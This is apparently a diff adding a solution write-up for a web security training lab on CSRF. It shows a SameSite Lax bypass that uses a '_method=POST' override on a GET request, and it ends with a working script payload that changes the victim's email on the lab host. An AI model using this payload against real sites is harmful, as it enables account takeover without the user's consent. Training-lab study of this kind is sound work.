@@ -1,0 +1,37 @@
+// Lab: SameSite Lax bypass via method override
+
+This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+
+// Solution
+
+1. First update the email and Intercept the Request go to Http history of /my-account/change-email
+   then send the request to repeater.
+
+2. Now Right click and click to change request method and the POST request convert to GET 
+   Now in the GET /my-account/change-email?email=test%40usertest.com HTTP/1.1  inject
+   &_method=POST So the request become 
+   GET /my-account/change-email?email=test%40usertest.com&_method=POST HTTP/1.1
+   and send click send!!
+
+   Now in Response we get:
+
+HTTP/2 302 Found
+
+Location: /my-account?id=wiener
+
+X-Frame-Options: SAMEORIGIN
+
+Content-Length: 0
+
+3. Now Inject the exploit in the exploit server
+
+// Exploit
+
+<script>
+    document.location = "https://0ac3002304bf7c69802b03ec00a7000d.web-security-academy.net/my-account/change-email?email=bobby@micrsoft.com&_method=POST";
+</script>
